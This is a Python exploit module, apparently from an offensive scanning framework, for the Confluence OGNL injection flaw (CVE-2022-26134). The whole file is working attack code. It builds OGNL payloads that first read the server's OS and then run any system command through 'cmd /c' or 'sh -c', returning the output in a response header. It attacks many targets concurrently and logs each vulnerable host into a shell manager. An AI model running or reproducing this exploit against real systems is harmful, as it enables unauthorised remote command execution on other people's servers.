from zerooo.controller.shell import shell_manage
from zerooo.core.asyncpool import async_run
from zerooo.core.log import LOGGER
from zerooo.core.options import Option, OptArgset
from zerooo.request.httpclient import HttpClient
from zerooo.utils.data import random_ua


class Zerooosploit(Option):

    def __init__(self):
        super(self.__class__, self).__init__()
        self.info = {
            'Name': 'Confluence OGNL表达式注入命令执行漏洞',
            'Module': 'exploit/atlassian/confluence/cve-2022-26134-rce',
            'Product': 'Confluence',
            'Cve': '',
            'Create_date': '20220604',
            'Description': 'Confluence OGNL表达式注入命令执行漏洞',
            'Authors': '',
            'References': ''
        }

        self.option = {
            'urls': {'Current Setting': OptArgset.urls, 'Required': 'yes', 'Description': '目标url，多个目标请用,分开'},
            'command': {'Current Setting': 'whoami', 'Required': 'yes', 'Description': '执行的系统命令'},
            'limit': {'Current Setting': None, 'Required': 'no', 'Description': '并发限制（默认根据当前系统自动调整）'}
        }

        self.headers = {'User-Agent': random_ua(), 'Accept': 'application/json, text/javascript, */*; q=0.01',
                        'Accept-Language': 'en-US,en;q=0.5'}

    async def command_ognl(self, urls):
        # 判断系统版本
        check_os = f'''${{(%23a%3d%40java.lang.System%40getProperty("os.name")).(%40com.opensymphony.webwork.ServletActionContext%40getResponse().setHeader('X-Confluence',%23a))}}/'''
        vul_url = urls + check_os
        resp = await HttpClient().send_request_cgi('GET', headers=self.headers, url=vul_url)
        if resp:
            if 'X-Confluence' in resp['headers'].keys():
                LOGGER.success(f'目标存在漏洞 (The target find vuln): {urls}')
                os = resp['headers']['X-Confluence'].lower()
                command = self.get_options('command')
                if 'win' in os:
                    payload = '''${{(%23a=@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec("cmd /c {0}").getInputStream(),"utf-8")).(@com.opensymphony.webwork.ServletActionContext@getResponse().setHeader('X-Confluence',%23a))}}/'''.format(
                        command)
                else:
                    payload = '''${{(%23a=@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec("sh -c {0}").getInputStream(),"utf-8")).(@com.opensymphony.webwork.ServletActionContext@getResponse().setHeader('X-Confluence',%23a))}}/'''.format(
                        command)

                vul_url_cmd = urls + payload
                resp1 = await HttpClient().send_request_cgi('GET', headers=self.headers, url=vul_url_cmd)
                if resp1:
                    if 'X-Confluence' in resp1['headers'].keys():
                        result = resp1['headers']['X-Confluence']
                        LOGGER.success(f'{urls} command: {result}')
                    else:
                        LOGGER.warning(f'执行命令失败 (Execute command failed): {urls}')

                return resp, urls, os

        LOGGER.warning(f'目标不存在漏洞 (The target not vuln): {urls}')
        return None, None, None

    def command_ognl_callback(self, future):
        resp, urls, os = future.result()
        if resp:
            # 存入shell管理器
            shell_manage.add_shell(urls, os, self.info['Module'])

    def exploit(self):
        urls = self.get_options('urls')
        limit = self.get_options('limit')
        async_run(self.command_ognl, urls, self.command_ognl_callback, limit)
        LOGGER.info('运行完成 (exploit complete)')
